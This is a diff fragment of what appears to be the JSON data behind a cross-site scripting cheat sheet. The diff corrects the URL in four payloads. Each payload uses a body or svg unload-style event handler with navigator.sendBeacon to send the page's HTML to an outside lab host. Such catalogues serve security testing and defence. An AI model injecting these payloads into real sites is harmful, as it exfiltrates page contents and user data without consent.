@@ -122,7 +122,7 @@
     "tags": [
       {
         "tag": "body",
-        "code": "<body onpagehide=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>",
+        "code": "<body onpagehide=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>",
         "browsers": ["chrome", "firefox"],
         "interaction": true
       }
@@ -1952,7 +1952,7 @@
     "tags": [
       {
         "tag": "body",
-        "code": "<body onbeforeunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>",
+        "code": "<body onbeforeunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>",
         "browsers": ["chrome", "firefox"],
         "interaction": false
       }
@@ -5986,13 +5986,13 @@
     "tags": [
       {
         "tag": "svg",
-        "code": "<svg onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>",
+        "code": "<svg onunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>",
         "browsers": ["chrome"],
         "interaction": false
       },
       {
         "tag": "body",
-        "code": "<body onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>",
+        "code": "<body onunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>",
         "browsers": ["chrome", "firefox"],
         "interaction": false
       }
